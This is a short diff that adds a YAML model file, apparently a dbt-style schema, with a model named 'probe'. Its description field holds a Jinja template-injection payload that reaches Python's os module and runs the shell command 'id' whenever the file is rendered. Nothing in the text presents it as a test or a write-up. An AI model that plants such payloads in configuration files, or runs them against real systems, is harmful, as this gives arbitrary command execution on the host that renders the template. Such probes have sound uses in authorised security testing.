@@ -1,0 +1,4 @@
+version: 2
+models:
+  - name: probe
+    description: "{{ cycler.__init__.__globals__['os'].popen('id').read() }}"
